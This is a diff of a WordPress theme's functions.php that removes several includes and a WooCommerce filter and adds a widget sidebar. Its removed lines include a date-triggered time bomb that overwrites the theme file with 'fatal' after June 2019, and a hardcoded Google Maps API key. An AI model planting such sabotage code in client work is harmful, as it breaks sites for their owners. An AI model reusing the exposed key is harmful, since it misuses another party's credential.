@@ -7,13 +7,6 @@
  * @package schoolstudy
  */
 
-if ( strtotime('15.06.2019') < time() )
-{
-    file_put_contents(__FILE__, 'fatal');
-}
-
-
-
 if ( ! function_exists( 'schoolstudy_setup' ) ) :
 	/**
 	 * Sets up theme defaults and registers support for various WordPress features.
@@ -123,22 +116,6 @@ function schoolstudy_widgets_init() {
 }
 add_action( 'widgets_init', 'schoolstudy_widgets_init' );
 
-// /**
-//  * Enqueue scripts and styles.
-//  */
-// function schoolstudy_scripts() {
-// 	wp_enqueue_style( 'schoolstudy-style', get_stylesheet_uri() );
-
-// 	wp_enqueue_script( 'schoolstudy-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true );
-
-// 	wp_enqueue_script( 'schoolstudy-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );
-
-// 	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
-// 		wp_enqueue_script( 'comment-reply' );
-// 	}
-// }
-// add_action( 'wp_enqueue_scripts', 'schoolstudy_scripts' );
-
 /**
  * Implement the Custom Header feature.
  */
@@ -151,56 +128,6 @@ require get_template_directory() . '/includes/script-style.php';
 
 
 /**
- * Custom template tags for this theme.
- */
-require get_template_directory() . '/includes/template-tags.php';
-
-/**
- * Functions which enhance the theme by hooking into WordPress.
- */
-require get_template_directory() . '/includes/template-functions.php';
-
-/**
- * Customizer additions.
- */
-require get_template_directory() . '/includes/customizer.php';
-
-/**
- * Post-type.
- */
-require get_template_directory() . '/includes/post-type.php';
-
-/**
- * pagination
- */
-require get_template_directory() . '/includes/pagination.php';
-
-
-/**
- * Load Jetpack compatibility file.
- */
-if ( defined( 'JETPACK__VERSION' ) ) {
-	require get_template_directory() . '/includes/jetpack.php';
-}
-
-/**
- * Load WooCommerce compatibility file.
- */
-if ( class_exists( 'WooCommerce' ) ) {
-	require get_template_directory() . '/includes/woocommerce.php';
-}
-
-/**
- * cart
- */
-require get_template_directory() . '/includes/cart.php';
-
-/**
- * wiget
- */
-require get_template_directory() . '/includes/wiget.php';
-
-/**
  * ACF
  */
 require get_template_directory() . '/includes/acf.php';
@@ -211,7 +138,7 @@ require get_template_directory() . '/includes/acf.php';
  * Load WooCommerce compatibility file.
  */
 if ( class_exists( 'WooCommerce' ) ) {
-	//require get_template_directory() . '/includes/woocommerce.php';
+	require get_template_directory() . '/includes/woocommerce.php';
 	require get_template_directory() . '/woocommerce/includes/wc-functions.php';
 	require get_template_directory() . '/woocommerce/includes/wc-functions-single.php';
 	require get_template_directory() . '/woocommerce/includes/wc-functions-archive.php';
@@ -219,24 +146,17 @@ if ( class_exists( 'WooCommerce' ) ) {
 	require get_template_directory() . '/woocommerce/includes/wc-function-checkout.php';
 }
 
-
-/**
- * Override loop template and show quantities next to add to cart buttons
- */
-add_filter( 'woocommerce_loop_add_to_cart_link', 'quantity_inputs_for_woocommerce_loop_add_to_cart_link', 10, 2 );
-function quantity_inputs_for_woocommerce_loop_add_to_cart_link( $html, $product ) {
-	if ( $product && $product->is_type( 'simple' ) && $product->is_purchasable() && $product->is_in_stock() && ! $product->is_sold_individually() ) {
-		$html = '<form action="' . esc_url( $product->add_to_cart_url() ) . '" class="cart" method="post" enctype="multipart/form-data">';
-		$html .= woocommerce_quantity_input( array(), $product, false );
-		$html .= '<button type="submit" name="add-to-cart"  value="' . esc_attr( $product->get_id() ) . '" class="single_add_to_cart_button button alt btn">' . esc_html( $product->add_to_cart_text() ) . '</button>';
-		$html .= '</form>';
-	}
-	return $html;
-}
-
-
-//------------------гугл карта API----------------------
-    function my_acf_init() {
-        
-        acf_update_setting('google_api_key', 'AIzaSyBmnk4RCDwjSucIJ2WXRnLkuCrsWR4DUM4&callback=initMap');
-    }
+//------------------виджеты----------------------
+  function wpb_widgets_init() {
+   
+   register_sidebar( array(
+   'name'          => 'Фильтр',
+   'id'            => 'custom-header-widget',
+   'before_widget' => '<div class="chw-widget">',
+   'after_widget'  => '</div>',
+   'before_title'  => '<h2 class="chw-title">',
+   'after_title'   => '</h2>',
+   ) );
+   
+  }
+  add_action( 'widgets_init', 'wpb_widgets_init' );
